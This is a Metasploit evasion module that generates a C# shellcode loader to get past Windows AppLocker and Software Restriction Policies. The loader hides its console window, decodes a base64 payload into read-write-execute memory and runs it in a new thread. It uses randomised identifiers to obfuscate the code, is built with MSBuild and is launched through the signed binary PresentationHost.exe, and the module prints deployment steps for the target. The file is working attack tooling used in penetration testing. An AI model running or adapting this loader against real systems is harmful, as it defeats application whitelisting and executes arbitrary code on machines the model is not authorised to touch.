##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Evasion

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Applocker Evasion - Windows Presentation Foundation Host',
      'Description' => %(
         This module will assist you in evading Microsoft
         Windows Applocker and Software Restriction Policies.
         This technique utilises the Microsoft signed binary
         PresentationHost.exe to execute user supplied code.
                        ),
      'Author'      =>
        [
          'Nick Tyrer <@NickTyrer>', # module development
          'Casey Smith' # presentationhost bypass research
        ],
      'License'     => 'MSF_LICENSE',
      'Platform'    => 'win',
      'Arch'        => [ARCH_X86],
      'Targets'     => [['Microsoft Windows', {}]])
    )

    register_options(
      [
        OptString.new('CS_FILE', [true, 'Filename for the .xaml.cs file (default: presentationhost.xaml.cs)', 'presentationhost.xaml.cs']),
        OptString.new('MANIFEST_FILE', [true, 'Filename for the .manifest file (default: presentationhost.manifest)', 'presentationhost.manifest']),
        OptString.new('CSPROJ_FILE', [true, 'Filename for the .csproj file (default: presentationhost.csproj)', 'presentationhost.csproj'])
      ]
    )

    deregister_options('FILENAME')
  end

  def build_payload
    Rex::Text.encode_base64(payload.encoded)
  end

  def obfu
    Rex::Text.rand_text_alpha 8
  end

  def presentationhost_xaml_cs
    esc = build_payload
    mod = [obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu, obfu]
    <<~HEREDOC
      using System;
      class #{mod[0]}{
      static void Main(string[] args){
      IntPtr #{mod[1]};
      #{mod[1]} = GetConsoleWindow();
      ShowWindow(#{mod[1]}, #{mod[2]});
      string #{mod[3]} = "#{esc}";
      byte[] #{mod[4]} = Convert.FromBase64String(#{mod[3]});
      byte[] #{mod[5]} = #{mod[4]};
      IntPtr #{mod[6]} = VirtualAlloc(IntPtr.Zero, (UIntPtr)#{mod[5]}.Length, #{mod[7]}, #{mod[8]});
      System.Runtime.InteropServices.Marshal.Copy(#{mod[5]}, 0, #{mod[6]}, #{mod[5]}.Length);
      IntPtr #{mod[9]} = IntPtr.Zero;
      WaitForSingleObject(CreateThread(#{mod[9]}, UIntPtr.Zero, #{mod[6]}, #{mod[9]}, 0, ref #{mod[9]}), #{mod[10]});}
      private static Int32 #{mod[7]}=0x1000;
      private static IntPtr #{mod[8]}=(IntPtr)0x40;
      private static UInt32 #{mod[10]} = 0xFFFFFFFF;
      [System.Runtime.InteropServices.DllImport("kernel32")]
      private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);
      [System.Runtime.InteropServices.DllImport("kernel32")]
      private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr id);
      [System.Runtime.InteropServices.DllImport("kernel32")]
      private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);
      [System.Runtime.InteropServices.DllImport("user32.dll")]
      static extern bool ShowWindow(IntPtr #{mod[1]}, int nCmdShow);
      [System.Runtime.InteropServices.DllImport("Kernel32")]
      private static extern IntPtr GetConsoleWindow();
      const int #{mod[2]} = 0;}
    HEREDOC
  end

  def presentationhost_manifest
    <<~HEREDOC
      <?xml version="1.0" encoding="utf-8"?>
      <assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1">
      <assemblyIdentity version="1.0.0.0" name="MyApplication.app" />
      <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
      <security>
      <applicationRequestMinimum>
      <defaultAssemblyRequest permissionSetReference="Custom" />
      <PermissionSet class="System.Security.PermissionSet" version="1" ID="Custom" SameSite="site" Unrestricted="true" />
      </applicationRequestMinimum>
      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
      <requestedExecutionLevel level="asInvoker" uiAccess="false" />
      </requestedPrivileges>
      </security>
      </trustInfo>
      </assembly>
    HEREDOC
  end

  def presentationhost_csproj
    <<~HEREDOC
      <?xml version="1.0" encoding="utf-8"?>
      <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
      <Import Project="$(MSBuildExtensionsPath)\\$(MSBuildToolsVersion)\\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\\$(MSBuildToolsVersion)\\Microsoft.Common.props')" />
      <PropertyGroup>
      <Configuration Condition=" '$(Configuration)' == '' ">Release</Configuration>
      <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
      <OutputType>WinExe</OutputType>
      <HostInBrowser>true</HostInBrowser>
      <GenerateManifests>true</GenerateManifests>
      <SignManifests>false</SignManifests>
      </PropertyGroup>
      <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
      <Optimize>true</Optimize>
      <OutputPath>.</OutputPath>
      </PropertyGroup>
      <ItemGroup>
      <Reference Include="System" />
      </ItemGroup>
      <ItemGroup>
      <Compile Include="#{datastore['CS_FILE']}">
      <DependentUpon>#{datastore['CS_FILE']}</DependentUpon>
      <SubType>Code</SubType>
      </Compile>
      </ItemGroup>
      <ItemGroup>
      <None Include="#{datastore['MANIFEST_FILE']}" />
      </ItemGroup>
      <Import Project="$(MSBuildToolsPath)\\Microsoft.CSharp.targets" />
      </Project>
    HEREDOC
  end

  def file_format_filename(name = '')
    name.empty? ? @fname : @fname = name
  end

  def create_files
    f1 = datastore['CS_FILE'].empty? ? 'presentationhost.xaml.cs' : datastore['CS_FILE']
    f1 << '.xaml.cs' unless f1.downcase.end_with?('.xaml.cs')
    f2 = datastore['MANIFEST_FILE'].empty? ? 'presentationhost.manifest' : datastore['MANIFEST_FILE']
    f2 << '.manifest' unless f2.downcase.end_with?('.manifest')
    f3 = datastore['CSPROJ_FILE'].empty? ? 'presentationhost.csproj' : datastore['CSPROJ_FILE']
    f3 << '.csproj' unless f3.downcase.end_with?('.csproj')
    cs_file = presentationhost_xaml_cs
    manifest_file = presentationhost_manifest
    csproj_file = presentationhost_csproj
    file_format_filename(f1)
    file_create(cs_file)
    file_format_filename(f2)
    file_create(manifest_file)
    file_format_filename(f3)
    file_create(csproj_file)
  end

  def instructions
    print_status "Copy #{datastore['CS_FILE']}, #{datastore['MANIFEST_FILE']} and #{datastore['CSPROJ_FILE']} to the target"
    print_status "Compile using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\MSBuild.exe #{datastore['CSPROJ_FILE']}"
    print_status "Execute using: C:\\Windows\\System32\\PresentationHost.exe [Full Path To] #{datastore['CS_FILE'].gsub('.xaml.cs', '.xbap')}"
  end

  def run
    create_files
    instructions
  end
end
